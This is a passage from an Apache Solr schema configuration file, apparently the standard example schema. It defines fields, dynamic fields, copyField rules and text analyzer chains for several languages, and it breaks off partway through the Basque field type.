   <field name=""comments"" type=""text_general"" indexed=""true"" stored=""true""/>
   <field name=""author"" type=""text_general"" indexed=""true"" stored=""true""/>
   <field name=""keywords"" type=""text_general"" indexed=""true"" stored=""true""/>
   <field name=""category"" type=""text_general"" indexed=""true"" stored=""true""/>
   <field name=""resourcename"" type=""text_general"" indexed=""true"" stored=""true""/>
   <field name=""url"" type=""text_general"" indexed=""true"" stored=""true""/>
   <field name=""content_type"" type=""string"" indexed=""true"" stored=""true"" multiValued=""true""/>
   <field name=""last_modified"" type=""date"" indexed=""true"" stored=""true""/>
   <field name=""links"" type=""string"" indexed=""true"" stored=""true"" multiValued=""true""/>

   <!-- Main body of document extracted by SolrCell.
        NOTE: This field is not indexed by default, since it is also copied to ""text""
        using copyField below. This is to save space. Use this field for returning and
        highlighting document content. Use the ""text"" field to search the content. -->
   <field name=""content"" type=""text_general"" indexed=""false"" stored=""true"" multiValued=""true""/>


   <!-- catchall field, containing all other searchable text fields (implemented
        via copyField further on in this schema  -->
   <field name=""text"" type=""text_general"" indexed=""true"" stored=""false"" multiValued=""true""/>

   <!-- catchall text field that indexes tokens both normally and in reverse for efficient
        leading wildcard queries. -->
   <field name=""text_rev"" type=""text_general_rev"" indexed=""true"" stored=""false"" multiValued=""true""/>

   <!-- non-tokenized version of manufacturer to make it easier to sort or group
        results by manufacturer.  copied from ""manu"" via copyField -->
   <field name=""manu_exact"" type=""string"" indexed=""true"" stored=""false""/>

   <field name=""payloads"" type=""payloads"" indexed=""true"" stored=""true""/>

   <field name=""_version_"" type=""long"" indexed=""true"" stored=""true""/>

   <!--
     Some fields such as popularity and manu_exact could be modified to
     leverage doc values:
     <field name=""popularity"" type=""int"" indexed=""true"" stored=""true"" docValues=""true"" default=""0"" />
     <field name=""manu_exact"" type=""string"" indexed=""false"" stored=""false"" docValues=""true"" default="""" />

     Although it would make indexing slightly slower and the index bigger, it
     would also make the index faster to load, more memory-efficient and more
     NRT-friendly.
     -->

   <!-- Dynamic field definitions allow using convention over configuration
       for fields via the specification of patterns to match field names.
       EXAMPLE:  name=""*_i"" will match any field ending in _i (like myid_i, z_i)
       RESTRICTION: the glob-like pattern in the name attribute must have
       a ""*"" only at the start or the end.  -->

   <dynamicField name=""*_i""  type=""int""    indexed=""true""  stored=""true""/>
   <dynamicField name=""*_is"" type=""int""    indexed=""true""  stored=""true""  multiValued=""true""/>
   <dynamicField name=""*_s""  type=""string""  indexed=""true""  stored=""true"" />
   <dynamicField name=""*_ss"" type=""string""  indexed=""true""  stored=""true"" multiValued=""true""/>
   <dynamicField name=""*_l""  type=""long""   indexed=""true""  stored=""true""/>
   <dynamicField name=""*_ls"" type=""long""   indexed=""true""  stored=""true""  multiValued=""true""/>
   <dynamicField name=""*_t""  type=""text_general""    indexed=""true""  stored=""true""/>
   <dynamicField name=""*_txt"" type=""text_general""   indexed=""true""  stored=""true"" multiValued=""true""/>
   <dynamicField name=""*_en""  type=""text_en""    indexed=""true""  stored=""true"" multiValued=""true""/>
   <dynamicField name=""*_b""  type=""boolean"" indexed=""true"" stored=""true""/>
   <dynamicField name=""*_bs"" type=""boolean"" indexed=""true"" stored=""true""  multiValued=""true""/>
   <dynamicField name=""*_f""  type=""float""  indexed=""true""  stored=""true""/>
   <dynamicField name=""*_fs"" type=""float""  indexed=""true""  stored=""true""  multiValued=""true""/>
   <dynamicField name=""*_d""  type=""double"" indexed=""true""  stored=""true""/>
   <dynamicField name=""*_ds"" type=""double"" indexed=""true""  stored=""true""  multiValued=""true""/>

   <!-- Type used to index the lat and lon components for the ""location"" FieldType -->
   <dynamicField name=""*_coordinate""  type=""tdouble"" indexed=""true""  stored=""false"" />

   <dynamicField name=""*_dt""  type=""date""    indexed=""true""  stored=""true""/>
   <dynamicField name=""*_dts"" type=""date""    indexed=""true""  stored=""true"" multiValued=""true""/>
   <dynamicField name=""*_p""  type=""location"" indexed=""true"" stored=""true""/>

   <!-- some trie-coded dynamic fields for faster range queries -->
   <dynamicField name=""*_ti"" type=""tint""    indexed=""true""  stored=""true""/>
   <dynamicField name=""*_tl"" type=""tlong""   indexed=""true""  stored=""true""/>
   <dynamicField name=""*_tf"" type=""tfloat""  indexed=""true""  stored=""true""/>
   <dynamicField name=""*_td"" type=""tdouble"" indexed=""true""  stored=""true""/>
   <dynamicField name=""*_tdt"" type=""tdate""  indexed=""true""  stored=""true""/>

   <dynamicField name=""*_pi""  type=""pint""    indexed=""true""  stored=""true""/>
   <dynamicField name=""*_c""   type=""currency"" indexed=""true""  stored=""true""/>

   <dynamicField name=""ignored_*"" type=""ignored"" multiValued=""true""/>
   <dynamicField name=""attr_*"" type=""text_general"" indexed=""true"" stored=""true"" multiValued=""true""/>

   <dynamicField name=""random_*"" type=""random"" />

   <!-- uncomment the following to ignore any fields that don't already match an existing
        field name or dynamic field, rather than reporting them as an error.
        alternately, change the type=""ignored"" to some other type e.g. ""text"" if you want
        unknown fields indexed and/or stored by default -->
   <!--dynamicField name=""*"" type=""ignored"" multiValued=""true"" /-->

 </fields>


 <!-- Field to use to determine and enforce document uniqueness.
      Unless this field is marked with required=""false"", it will be a required field
   -->
 <uniqueKey>id</uniqueKey>

 <!-- DEPRECATED: The defaultSearchField is consulted by various query parsers when
  parsing a query string that isn't explicit about the field.  Machine (non-user)
  generated queries are best made explicit, or they can use the ""df"" request parameter
  which takes precedence over this.
  Note: Un-commenting defaultSearchField will be insufficient if your request handler
  in solrconfig.xml defines ""df"", which takes precedence. That would need to be removed.
 <defaultSearchField>text</defaultSearchField> -->

 <!-- DEPRECATED: The defaultOperator (AND|OR) is consulted by various query parsers
  when parsing a query string to determine if a clause of the query should be marked as
  required or optional, assuming the clause isn't already marked by some operator.
  The default is OR, which is generally assumed so it is not a good idea to change it
  globally here.  The ""q.op"" request parameter takes precedence over this.
 <solrQueryParser defaultOperator=""OR""/> -->

  <!-- copyField commands copy one field to another at the time a document
        is added to the index.  It's used either to index the same field differently,
        or to add multiple fields to the same field for easier/faster searching.  -->

   <copyField source=""cat"" dest=""text""/>
   <copyField source=""name"" dest=""text""/>
   <copyField source=""manu"" dest=""text""/>
   <copyField source=""features"" dest=""text""/>
   <copyField source=""includes"" dest=""text""/>
   <copyField source=""manu"" dest=""manu_exact""/>

   <!-- Copy the price into a currency enabled field (default USD) -->
   <copyField source=""price"" dest=""price_c""/>

   <!-- Text fields from SolrCell to search by default in our catch-all field -->
   <copyField source=""title"" dest=""text""/>
   <copyField source=""author"" dest=""text""/>
   <copyField source=""description"" dest=""text""/>
   <copyField source=""keywords"" dest=""text""/>
   <copyField source=""content"" dest=""text""/>
   <copyField source=""content_type"" dest=""text""/>
   <copyField source=""resourcename"" dest=""text""/>
   <copyField source=""url"" dest=""text""/>

   <!-- Create a string version of author for faceting -->
   <copyField source=""author"" dest=""author_s""/>

   <!-- Above, multiple source fields are copied to the [text] field.
    Another way to map multiple source fields to the same
    destination field is to use the dynamic field syntax.
    copyField also supports a maxChars to copy setting.  -->

   <!-- <copyField source=""*_t"" dest=""text"" maxChars=""3000""/> -->

   <!-- copy name to alphaNameSort, a field designed for sorting by name -->
   <!-- <copyField source=""name"" dest=""alphaNameSort""/> -->

  <types>
    <!-- field type definitions. The ""name"" attribute is
       just a label to be used by field definitions.  The ""class""
       attribute and any other attributes determine the real
       behavior of the fieldType.
         Class names starting with ""solr"" refer to java classes in a
       standard package such as org.apache.solr.analysis
    -->

    <!-- The StrField type is not analyzed, but indexed/stored verbatim.
       It supports doc values but in that case the field needs to be
       single-valued and either required or have a default value.
      -->
    <fieldType name=""string"" class=""solr.StrField"" sortMissingLast=""true"" />

    <!-- boolean type: ""true"" or ""false"" -->
    <fieldType name=""boolean"" class=""solr.BoolField"" sortMissingLast=""true""/>

    <!-- sortMissingLast and sortMissingFirst attributes are optional attributes are
         currently supported on types that are sorted internally as strings
         and on numeric types.
       This includes ""string"",""boolean"", and, as of 3.5 (and 4.x),
       int, float, long, date, double, including the ""Trie"" variants.
       - If sortMissingLast=""true"", then a sort on this field will cause documents
         without the field to come after documents with the field,
         regardless of the requested sort order (asc or desc).
       - If sortMissingFirst=""true"", then a sort on this field will cause documents
         without the field to come before documents with the field,
         regardless of the requested sort order.
       - If sortMissingLast=""false"" and sortMissingFirst=""false"" (the default),
         then default lucene sorting will be used which places docs without the
         field first in an ascending sort and last in a descending sort.
    -->

    <!--
      Default numeric field types. For faster range queries, consider the tint/tfloat/tlong/tdouble types.

      These fields support doc values, but they require the field to be
      single-valued and either be required or have a default value.
    -->
    <fieldType name=""int"" class=""solr.TrieIntField"" precisionStep=""0"" positionIncrementGap=""0""/>
    <fieldType name=""float"" class=""solr.TrieFloatField"" precisionStep=""0"" positionIncrementGap=""0""/>
    <fieldType name=""long"" class=""solr.TrieLongField"" precisionStep=""0"" positionIncrementGap=""0""/>
    <fieldType name=""double"" class=""solr.TrieDoubleField"" precisionStep=""0"" positionIncrementGap=""0""/>

    <!--
     Numeric field types that index each value at various levels of precision
     to accelerate range queries when the number of values between the range
     endpoints is large. See the javadoc for NumericRangeQuery for internal
     implementation details.

     Smaller precisionStep values (specified in bits) will lead to more tokens
     indexed per value, slightly larger index size, and faster range queries.
     A precisionStep of 0 disables indexing at different precision levels.
    -->
    <fieldType name=""tint"" class=""solr.TrieIntField"" precisionStep=""8"" positionIncrementGap=""0""/>
    <fieldType name=""tfloat"" class=""solr.TrieFloatField"" precisionStep=""8"" positionIncrementGap=""0""/>
    <fieldType name=""tlong"" class=""solr.TrieLongField"" precisionStep=""8"" positionIncrementGap=""0""/>
    <fieldType name=""tdouble"" class=""solr.TrieDoubleField"" precisionStep=""8"" positionIncrementGap=""0""/>

    <!-- The format for this date field is of the form 1995-12-31T23:59:59Z, and
         is a more restricted form of the canonical representation of dateTime
         http://www.w3.org/TR/xmlschema-2/#dateTime
         The trailing ""Z"" designates UTC time and is mandatory.
         Optional fractional seconds are allowed: 1995-12-31T23:59:59.999Z
         All other components are mandatory.

         Expressions can also be used to denote calculations that should be
         performed relative to ""NOW"" to determine the value, ie...

               NOW/HOUR
                  ... Round to the start of the current hour
               NOW-1DAY
                  ... Exactly 1 day prior to now
               NOW/DAY+6MONTHS+3DAYS
                  ... 6 months and 3 days in the future from the start of
                      the current day

         Consult the DateField javadocs for more information.

         Note: For faster range queries, consider the tdate type
      -->
    <fieldType name=""date"" class=""solr.TrieDateField"" precisionStep=""0"" positionIncrementGap=""0""/>

    <!-- A Trie based date field for faster date range queries and date faceting. -->
    <fieldType name=""tdate"" class=""solr.TrieDateField"" precisionStep=""6"" positionIncrementGap=""0""/>


    <!--Binary data type. The data should be sent/retrieved in as Base64 encoded Strings -->
    <fieldtype name=""binary"" class=""solr.BinaryField""/>

    <!--
      Note:
      These should only be used for compatibility with existing indexes (created with lucene or older Solr versions).
      Use Trie based fields instead. As of Solr 3.5 and 4.x, Trie based fields support sortMissingFirst/Last

      Plain numeric field types that store and index the text
      value verbatim (and hence don't correctly support range queries, since the
      lexicographic ordering isn't equal to the numeric ordering)
    -->
    <fieldType name=""pint"" class=""solr.IntField""/>
    <fieldType name=""plong"" class=""solr.LongField""/>
    <fieldType name=""pfloat"" class=""solr.FloatField""/>
    <fieldType name=""pdouble"" class=""solr.DoubleField""/>
    <fieldType name=""pdate"" class=""solr.DateField"" sortMissingLast=""true""/>

    <!-- The ""RandomSortField"" is not used to store or search any
         data.  You can declare fields of this type it in your schema
         to generate pseudo-random orderings of your docs for sorting
         or function purposes.  The ordering is generated based on the field
         name and the version of the index. As long as the index version
         remains unchanged, and the same field name is reused,
         the ordering of the docs will be consistent.
         If you want different psuedo-random orderings of documents,
         for the same version of the index, use a dynamicField and
         change the field name in the request.
     -->
    <fieldType name=""random"" class=""solr.RandomSortField"" indexed=""true"" />

    <!-- solr.TextField allows the specification of custom text analyzers
         specified as a tokenizer and a list of token filters. Different
         analyzers may be specified for indexing and querying.

         The optional positionIncrementGap puts space between multiple fields of
         this type on the same document, with the purpose of preventing false phrase
         matching across fields.

         For more info on customizing your analyzer chain, please see
         http://wiki.apache.org/solr/AnalyzersTokenizersTokenFilters
     -->

    <!-- One can also specify an existing Analyzer class that has a
         default constructor via the class attribute on the analyzer element.
         Example:
    <fieldType name=""text_greek"" class=""solr.TextField"">
      <analyzer class=""org.apache.lucene.analysis.el.GreekAnalyzer""/>
    </fieldType>
    -->

    <!-- A text field that only splits on whitespace for exact matching of words -->
    <fieldType name=""text_ws"" class=""solr.TextField"" positionIncrementGap=""100"">
      <analyzer>
        <tokenizer class=""solr.WhitespaceTokenizerFactory""/>
      </analyzer>
    </fieldType>

    <!-- A general text field that has reasonable, generic
         cross-language defaults: it tokenizes with StandardTokenizer,
   removes stop words from case-insensitive ""stopwords.txt""
   (empty by default), and down cases.  At query time only, it
   also applies synonyms. -->
    <fieldType name=""text_general"" class=""solr.TextField"" positionIncrementGap=""100"">
      <analyzer type=""index"">
        <tokenizer class=""solr.StandardTokenizerFactory""/>
        <filter class=""solr.StopFilterFactory"" ignoreCase=""true"" words=""stopwords.txt"" />
        <!-- in this example, we will only use synonyms at query time
        <filter class=""solr.SynonymFilterFactory"" synonyms=""index_synonyms.txt"" ignoreCase=""true"" expand=""false""/>
        -->
        <filter class=""solr.LowerCaseFilterFactory""/>
      </analyzer>
      <analyzer type=""query"">
        <tokenizer class=""solr.StandardTokenizerFactory""/>
        <filter class=""solr.StopFilterFactory"" ignoreCase=""true"" words=""stopwords.txt"" />
        <filter class=""solr.SynonymFilterFactory"" synonyms=""synonyms.txt"" ignoreCase=""true"" expand=""true""/>
        <filter class=""solr.LowerCaseFilterFactory""/>
      </analyzer>
    </fieldType>

    <!-- A text field with defaults appropriate for English: it
         tokenizes with StandardTokenizer, removes English stop words
         (lang/stopwords_en.txt), down cases, protects words from protwords.txt, and
         finally applies Porter's stemming.  The query time analyzer
         also applies synonyms from synonyms.txt. -->
    <fieldType name=""text_en"" class=""solr.TextField"" positionIncrementGap=""100"">
      <analyzer type=""index"">
        <tokenizer class=""solr.StandardTokenizerFactory""/>
        <!-- in this example, we will only use synonyms at query time
        <filter class=""solr.SynonymFilterFactory"" synonyms=""index_synonyms.txt"" ignoreCase=""true"" expand=""false""/>
        -->
        <!-- Case insensitive stop word removal.
        -->
        <filter class=""solr.StopFilterFactory""
                ignoreCase=""true""
                words=""lang/stopwords_en.txt""
                />
        <filter class=""solr.LowerCaseFilterFactory""/>
  <filter class=""solr.EnglishPossessiveFilterFactory""/>
        <filter class=""solr.KeywordMarkerFilterFactory"" protected=""protwords.txt""/>
  <!-- Optionally you may want to use this less aggressive stemmer instead of PorterStemFilterFactory:
        <filter class=""solr.EnglishMinimalStemFilterFactory""/>
  -->
        <filter class=""solr.PorterStemFilterFactory""/>
      </analyzer>
      <analyzer type=""query"">
        <tokenizer class=""solr.StandardTokenizerFactory""/>
        <filter class=""solr.SynonymFilterFactory"" synonyms=""synonyms.txt"" ignoreCase=""true"" expand=""true""/>
        <filter class=""solr.StopFilterFactory""
                ignoreCase=""true""
                words=""lang/stopwords_en.txt""
                />
        <filter class=""solr.LowerCaseFilterFactory""/>
  <filter class=""solr.EnglishPossessiveFilterFactory""/>
        <filter class=""solr.KeywordMarkerFilterFactory"" protected=""protwords.txt""/>
  <!-- Optionally you may want to use this less aggressive stemmer instead of PorterStemFilterFactory:
        <filter class=""solr.EnglishMinimalStemFilterFactory""/>
  -->
        <filter class=""solr.PorterStemFilterFactory""/>
      </analyzer>
    </fieldType>

    <!-- A text field with defaults appropriate for English, plus
   aggressive word-splitting and autophrase features enabled.
   This field is just like text_en, except it adds
   WordDelimiterFilter to enable splitting and matching of
   words on case-change, alpha numeric boundaries, and
   non-alphanumeric chars.  This means certain compound word
   cases will work, for example query ""wi fi"" will match
   document ""WiFi"" or ""wi-fi"".
        -->
    <fieldType name=""text_en_splitting"" class=""solr.TextField"" positionIncrementGap=""100"" autoGeneratePhraseQueries=""true"">
      <analyzer type=""index"">
        <tokenizer class=""solr.WhitespaceTokenizerFactory""/>
        <!-- in this example, we will only use synonyms at query time
        <filter class=""solr.SynonymFilterFactory"" synonyms=""index_synonyms.txt"" ignoreCase=""true"" expand=""false""/>
        -->
        <!-- Case insensitive stop word removal.
        -->
        <filter class=""solr.StopFilterFactory""
                ignoreCase=""true""
                words=""lang/stopwords_en.txt""
                />
        <filter class=""solr.WordDelimiterFilterFactory"" generateWordParts=""1"" generateNumberParts=""1"" catenateWords=""1"" catenateNumbers=""1"" catenateAll=""0"" splitOnCaseChange=""1""/>
        <filter class=""solr.LowerCaseFilterFactory""/>
        <filter class=""solr.KeywordMarkerFilterFactory"" protected=""protwords.txt""/>
        <filter class=""solr.PorterStemFilterFactory""/>
      </analyzer>
      <analyzer type=""query"">
        <tokenizer class=""solr.WhitespaceTokenizerFactory""/>
        <filter class=""solr.SynonymFilterFactory"" synonyms=""synonyms.txt"" ignoreCase=""true"" expand=""true""/>
        <filter class=""solr.StopFilterFactory""
                ignoreCase=""true""
                words=""lang/stopwords_en.txt""
                />
        <filter class=""solr.WordDelimiterFilterFactory"" generateWordParts=""1"" generateNumberParts=""1"" catenateWords=""0"" catenateNumbers=""0"" catenateAll=""0"" splitOnCaseChange=""1""/>
        <filter class=""solr.LowerCaseFilterFactory""/>
        <filter class=""solr.KeywordMarkerFilterFactory"" protected=""protwords.txt""/>
        <filter class=""solr.PorterStemFilterFactory""/>
      </analyzer>
    </fieldType>

    <!-- Less flexible matching, but less false matches.  Probably not ideal for product names,
         but may be good for SKUs.  Can insert dashes in the wrong place and still match. -->
    <fieldType name=""text_en_splitting_tight"" class=""solr.TextField"" positionIncrementGap=""100"" autoGeneratePhraseQueries=""true"">
      <analyzer>
        <tokenizer class=""solr.WhitespaceTokenizerFactory""/>
        <filter class=""solr.SynonymFilterFactory"" synonyms=""synonyms.txt"" ignoreCase=""true"" expand=""false""/>
        <filter class=""solr.StopFilterFactory"" ignoreCase=""true"" words=""lang/stopwords_en.txt""/>
        <filter class=""solr.WordDelimiterFilterFactory"" generateWordParts=""0"" generateNumberParts=""0"" catenateWords=""1"" catenateNumbers=""1"" catenateAll=""0""/>
        <filter class=""solr.LowerCaseFilterFactory""/>
        <filter class=""solr.KeywordMarkerFilterFactory"" protected=""protwords.txt""/>
        <filter class=""solr.EnglishMinimalStemFilterFactory""/>
        <!-- this filter can remove any duplicate tokens that appear at the same position - sometimes
             possible with WordDelimiterFilter in conjuncton with stemming. -->
        <filter class=""solr.RemoveDuplicatesTokenFilterFactory""/>
      </analyzer>
    </fieldType>

    <!-- Just like text_general except it reverses the characters of
   each token, to enable more efficient leading wildcard queries. -->
    <fieldType name=""text_general_rev"" class=""solr.TextField"" positionIncrementGap=""100"">
      <analyzer type=""index"">
        <tokenizer class=""solr.StandardTokenizerFactory""/>
        <filter class=""solr.StopFilterFactory"" ignoreCase=""true"" words=""stopwords.txt"" />
        <filter class=""solr.LowerCaseFilterFactory""/>
        <filter class=""solr.ReversedWildcardFilterFactory"" withOriginal=""true""
           maxPosAsterisk=""3"" maxPosQuestion=""2"" maxFractionAsterisk=""0.33""/>
      </analyzer>
      <analyzer type=""query"">
        <tokenizer class=""solr.StandardTokenizerFactory""/>
        <filter class=""solr.SynonymFilterFactory"" synonyms=""synonyms.txt"" ignoreCase=""true"" expand=""true""/>
        <filter class=""solr.StopFilterFactory"" ignoreCase=""true"" words=""stopwords.txt"" />
        <filter class=""solr.LowerCaseFilterFactory""/>
      </analyzer>
    </fieldType>

    <!-- charFilter + WhitespaceTokenizer  -->
    <!--
    <fieldType name=""text_char_norm"" class=""solr.TextField"" positionIncrementGap=""100"" >
      <analyzer>
        <charFilter class=""solr.MappingCharFilterFactory"" mapping=""mapping-ISOLatin1Accent.txt""/>
        <tokenizer class=""solr.WhitespaceTokenizerFactory""/>
      </analyzer>
    </fieldType>
    -->

    <!-- This is an example of using the KeywordTokenizer along
         With various TokenFilterFactories to produce a sortable field
         that does not include some properties of the source text
      -->
    <fieldType name=""alphaOnlySort"" class=""solr.TextField"" sortMissingLast=""true"" omitNorms=""true"">
      <analyzer>
        <!-- KeywordTokenizer does no actual tokenizing, so the entire
             input string is preserved as a single token
          -->
        <tokenizer class=""solr.KeywordTokenizerFactory""/>
        <!-- The LowerCase TokenFilter does what you expect, which can be
             when you want your sorting to be case insensitive
          -->
        <filter class=""solr.LowerCaseFilterFactory"" />
        <!-- The TrimFilter removes any leading or trailing whitespace -->
        <filter class=""solr.TrimFilterFactory"" />
        <!-- The PatternReplaceFilter gives you the flexibility to use
             Java Regular expression to replace any sequence of characters
             matching a pattern with an arbitrary replacement string,
             which may include back references to portions of the original
             string matched by the pattern.

             See the Java Regular Expression documentation for more
             information on pattern and replacement string syntax.

             http://java.sun.com/j2se/1.6.0/docs/api/java/util/regex/package-summary.html
          -->
        <filter class=""solr.PatternReplaceFilterFactory""
                pattern=""([^a-z])"" replacement="""" replace=""all""
        />
      </analyzer>
    </fieldType>

    <fieldtype name=""phonetic"" stored=""false"" indexed=""true"" class=""solr.TextField"" >
      <analyzer>
        <tokenizer class=""solr.StandardTokenizerFactory""/>
        <filter class=""solr.DoubleMetaphoneFilterFactory"" inject=""false""/>
      </analyzer>
    </fieldtype>

    <fieldtype name=""payloads"" stored=""false"" indexed=""true"" class=""solr.TextField"" >
      <analyzer>
        <tokenizer class=""solr.WhitespaceTokenizerFactory""/>
        <!--
        The DelimitedPayloadTokenFilter can put payloads on tokens... for example,
        a token of ""foo|1.4""  would be indexed as ""foo"" with a payload of 1.4f
        Attributes of the DelimitedPayloadTokenFilterFactory :
         ""delimiter"" - a one character delimiter. Default is | (pipe)
   ""encoder"" - how to encode the following value into a playload
      float -> org.apache.lucene.analysis.payloads.FloatEncoder,
      integer -> o.a.l.a.p.IntegerEncoder
      identity -> o.a.l.a.p.IdentityEncoder
            Fully Qualified class name implementing PayloadEncoder, Encoder must have a no arg constructor.
         -->
        <filter class=""solr.DelimitedPayloadTokenFilterFactory"" encoder=""float""/>
      </analyzer>
    </fieldtype>

    <!-- lowercases the entire field value, keeping it as a single token.  -->
    <fieldType name=""lowercase"" class=""solr.TextField"" positionIncrementGap=""100"">
      <analyzer>
        <tokenizer class=""solr.KeywordTokenizerFactory""/>
        <filter class=""solr.LowerCaseFilterFactory"" />
      </analyzer>
    </fieldType>

    <!--
      Example of using PathHierarchyTokenizerFactory at index time, so
      queries for paths match documents at that path, or in descendent paths
    -->
    <fieldType name=""descendent_path"" class=""solr.TextField"">
      <analyzer type=""index"">
  <tokenizer class=""solr.PathHierarchyTokenizerFactory"" delimiter=""/"" />
      </analyzer>
      <analyzer type=""query"">
  <tokenizer class=""solr.KeywordTokenizerFactory"" />
      </analyzer>
    </fieldType>
    <!--
      Example of using PathHierarchyTokenizerFactory at query time, so
      queries for paths match documents at that path, or in ancestor paths
    -->
    <fieldType name=""ancestor_path"" class=""solr.TextField"">
      <analyzer type=""index"">
  <tokenizer class=""solr.KeywordTokenizerFactory"" />
      </analyzer>
      <analyzer type=""query"">
  <tokenizer class=""solr.PathHierarchyTokenizerFactory"" delimiter=""/"" />
      </analyzer>
    </fieldType>

    <!-- since fields of this type are by default not stored or indexed,
         any data added to them will be ignored outright.  -->
    <fieldtype name=""ignored"" stored=""false"" indexed=""false"" multiValued=""true"" class=""solr.StrField"" />

    <!-- This point type indexes the coordinates as separate fields (subFields)
      If subFieldType is defined, it references a type, and a dynamic field
      definition is created matching *___<typename>.  Alternately, if
      subFieldSuffix is defined, that is used to create the subFields.
      Example: if subFieldType=""double"", then the coordinates would be
        indexed in fields myloc_0___double,myloc_1___double.
      Example: if subFieldSuffix=""_d"" then the coordinates would be indexed
        in fields myloc_0_d,myloc_1_d
      The subFields are an implementation detail of the fieldType, and end
      users normally should not need to know about them.
     -->
    <fieldType name=""point"" class=""solr.PointType"" dimension=""2"" subFieldSuffix=""_d""/>

    <!-- A specialized field for geospatial search. If indexed, this fieldType must not be multivalued. -->
    <fieldType name=""location"" class=""solr.LatLonType"" subFieldSuffix=""_coordinate""/>

    <!-- An alternative geospatial field type new to Solr 4.  It supports multiValued and polygon shapes.
      For more information about this and other Spatial fields new to Solr 4, see:
      http://wiki.apache.org/solr/SolrAdaptersForLuceneSpatial4
    -->
    <fieldType name=""location_rpt"" class=""solr.SpatialRecursivePrefixTreeFieldType""
        geo=""true"" distErrPct=""0.025"" maxDistErr=""0.000009"" units=""degrees"" />

   <!-- Money/currency field type. See http://wiki.apache.org/solr/MoneyFieldType
        Parameters:
          defaultCurrency: Specifies the default currency if none specified. Defaults to ""USD""
          precisionStep:   Specifies the precisionStep for the TrieLong field used for the amount
          providerClass:   Lets you plug in other exchange provider backend:
                           solr.FileExchangeRateProvider is the default and takes one parameter:
                             currencyConfig: name of an xml file holding exchange rates
                           solr.OpenExchangeRatesOrgProvider uses rates from openexchangerates.org:
                             ratesFileLocation: URL or path to rates JSON file (default latest.json on the web)
                             refreshInterval: Number of minutes between each rates fetch (default: 1440, min: 60)
   -->
    <fieldType name=""currency"" class=""solr.CurrencyField"" precisionStep=""8"" defaultCurrency=""USD"" currencyConfig=""currency.xml"" />



   <!-- some examples for different languages (generally ordered by ISO code) -->

    <!-- Arabic -->
    <fieldType name=""text_ar"" class=""solr.TextField"" positionIncrementGap=""100"">
      <analyzer>
        <tokenizer class=""solr.StandardTokenizerFactory""/>
        <!-- for any non-arabic -->
        <filter class=""solr.LowerCaseFilterFactory""/>
        <filter class=""solr.StopFilterFactory"" ignoreCase=""true"" words=""lang/stopwords_ar.txt"" />
        <!-- normalizes  to , etc -->
        <filter class=""solr.ArabicNormalizationFilterFactory""/>
        <filter class=""solr.ArabicStemFilterFactory""/>
      </analyzer>
    </fieldType>

    <!-- Bulgarian -->
    <fieldType name=""text_bg"" class=""solr.TextField"" positionIncrementGap=""100"">
      <analyzer>
        <tokenizer class=""solr.StandardTokenizerFactory""/>
        <filter class=""solr.LowerCaseFilterFactory""/>
        <filter class=""solr.StopFilterFactory"" ignoreCase=""true"" words=""lang/stopwords_bg.txt"" />
        <filter class=""solr.BulgarianStemFilterFactory""/>
      </analyzer>
    </fieldType>

    <!-- Catalan -->
    <fieldType name=""text_ca"" class=""solr.TextField"" positionIncrementGap=""100"">
      <analyzer>
        <tokenizer class=""solr.StandardTokenizerFactory""/>
        <!-- removes l', etc -->
        <filter class=""solr.ElisionFilterFactory"" ignoreCase=""true"" articles=""lang/contractions_ca.txt""/>
        <filter class=""solr.LowerCaseFilterFactory""/>
        <filter class=""solr.StopFilterFactory"" ignoreCase=""true"" words=""lang/stopwords_ca.txt"" />
        <filter class=""solr.SnowballPorterFilterFactory"" language=""Catalan""/>
      </analyzer>
    </fieldType>

    <!-- CJK bigram (see text_ja for a Japanese configuration using morphological analysis) -->
    <fieldType name=""text_cjk"" class=""solr.TextField"" positionIncrementGap=""100"">
      <analyzer>
        <tokenizer class=""solr.StandardTokenizerFactory""/>
        <!-- normalize width before bigram, as e.g. half-width dakuten combine  -->
        <filter class=""solr.CJKWidthFilterFactory""/>
        <!-- for any non-CJK -->
        <filter class=""solr.LowerCaseFilterFactory""/>
        <filter class=""solr.CJKBigramFilterFactory""/>
      </analyzer>
    </fieldType>

    <!-- Czech -->
    <fieldType name=""text_cz"" class=""solr.TextField"" positionIncrementGap=""100"">
      <analyzer>
        <tokenizer class=""solr.StandardTokenizerFactory""/>
        <filter class=""solr.LowerCaseFilterFactory""/>
        <filter class=""solr.StopFilterFactory"" ignoreCase=""true"" words=""lang/stopwords_cz.txt"" />
        <filter class=""solr.CzechStemFilterFactory""/>
      </analyzer>
    </fieldType>

    <!-- Danish -->
    <fieldType name=""text_da"" class=""solr.TextField"" positionIncrementGap=""100"">
      <analyzer>
        <tokenizer class=""solr.StandardTokenizerFactory""/>
        <filter class=""solr.LowerCaseFilterFactory""/>
        <filter class=""solr.StopFilterFactory"" ignoreCase=""true"" words=""lang/stopwords_da.txt"" format=""snowball"" />
        <filter class=""solr.SnowballPorterFilterFactory"" language=""Danish""/>
      </analyzer>
    </fieldType>

    <!-- German -->
    <fieldType name=""text_de"" class=""solr.TextField"" positionIncrementGap=""100"">
      <analyzer>
        <tokenizer class=""solr.StandardTokenizerFactory""/>
        <filter class=""solr.LowerCaseFilterFactory""/>
        <filter class=""solr.StopFilterFactory"" ignoreCase=""true"" words=""lang/stopwords_de.txt"" format=""snowball"" />
        <filter class=""solr.GermanNormalizationFilterFactory""/>
        <filter class=""solr.GermanLightStemFilterFactory""/>
        <!-- less aggressive: <filter class=""solr.GermanMinimalStemFilterFactory""/> -->
        <!-- more aggressive: <filter class=""solr.SnowballPorterFilterFactory"" language=""German2""/> -->
      </analyzer>
    </fieldType>

    <!-- Greek -->
    <fieldType name=""text_el"" class=""solr.TextField"" positionIncrementGap=""100"">
      <analyzer>
        <tokenizer class=""solr.StandardTokenizerFactory""/>
        <!-- greek specific lowercase for sigma -->
        <filter class=""solr.GreekLowerCaseFilterFactory""/>
        <filter class=""solr.StopFilterFactory"" ignoreCase=""false"" words=""lang/stopwords_el.txt"" />
        <filter class=""solr.GreekStemFilterFactory""/>
      </analyzer>
    </fieldType>

    <!-- Spanish -->
    <fieldType name=""text_es"" class=""solr.TextField"" positionIncrementGap=""100"">
      <analyzer>
        <tokenizer class=""solr.StandardTokenizerFactory""/>
        <filter class=""solr.LowerCaseFilterFactory""/>
        <filter class=""solr.StopFilterFactory"" ignoreCase=""true"" words=""lang/stopwords_es.txt"" format=""snowball"" />
        <filter class=""solr.SpanishLightStemFilterFactory""/>
        <!-- more aggressive: <filter class=""solr.SnowballPorterFilterFactory"" language=""Spanish""/> -->
      </analyzer>
    </fieldType>

    <!-- Basque -->
    <fieldType name=""text_eu"" class=""solr.TextField"" positionIncrementGap=""100"">
